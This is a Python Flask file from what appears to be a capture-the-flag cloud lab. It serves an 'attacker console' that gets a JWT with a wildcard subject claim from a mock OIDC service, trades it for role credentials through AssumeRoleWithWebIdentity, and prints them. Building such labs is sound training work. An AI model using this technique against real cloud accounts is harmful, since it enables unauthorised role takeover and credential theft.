"""OIDC Federation Attacker Console — forge JWT, call AssumeRoleWithWebIdentity."""
import os, json, urllib.request, urllib.parse
from flask import Flask, request, render_template_string

app = Flask(__name__)
FLAG = os.environ.get("FLAG", "flag{cloud-11-default}")
OIDC = os.environ.get("OIDC_URL", "http://oidc:5000")
IAM = os.environ.get("IAM_URL", "http://iam:5000")

HTML = """<!DOCTYPE html><html><head><title>OIDC Federation Tester</title></head><body>
<h1>OIDC → IAM Federation Console</h1>
<form method="post" action="/attack">
<label>Subject claim: <input name="sub" value="repo:evil-org/*:ref:*" size="50"></label><br>
<label>Audience: <input name="aud" value="sts.amazonaws.com" size="30"></label><br>
<label>Role ARN: <input name="role" value="arn:aws:iam::000000000000:role/GitHubActionsRole" size="60"></label><br>
<button>Execute Attack</button></form>
<pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML, output="Ready")

@app.route("/attack", methods=["POST"])
def attack():
    sub = request.form.get("sub", "repo:evil-org/*:ref:*")
    aud = request.form.get("aud", "sts.amazonaws.com")
    role = request.form.get("role", "arn:aws:iam::000000000000:role/GitHubActionsRole")
    output = []
    try:
        # Step 1: Get OIDC token
        resp = urllib.request.urlopen(urllib.request.Request(f"{OIDC}/token",
            data=json.dumps({"sub":sub,"aud":aud}).encode(),
            headers={"Content-Type":"application/json"}, method="POST"))
        token = json.loads(resp.read())["access_token"]
        output.append(f"[+] JWT issued: {token[:60]}...")
        # Step 2: AssumeRoleWithWebIdentity
        body = urllib.parse.urlencode({
            "Action":"AssumeRoleWithWebIdentity","RoleArn":role,
            "WebIdentityToken":token,"RoleSessionName":"oidc-attack","Version":"2011-06-15"
        }).encode()
        resp2 = urllib.request.urlopen(urllib.request.Request(f"{IAM}/", data=body,
            headers={"Content-Type":"application/x-www-form-urlencoded"}))
        xml = resp2.read().decode()
        if "<Credentials>" in xml:
            output.append("[+] AssumeRoleWithWebIdentity SUCCESS")
            output.append(xml[:500])
        else: output.append("[-] AssumeRole failed: " + xml[:300])
    except urllib.error.HTTPError as e:
        output.append(f"[-] Error {e.code}: {e.read().decode()[:300]}")
    except Exception as e:
        output.append(f"[-] Error: {e}")
    return render_template_string(HTML, output="\n".join(output))

@app.route("/flag")
def flag():
    if request.remote_addr not in ("127.0.0.1","::1"): return "Forbidden", 403
    return FLAG

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
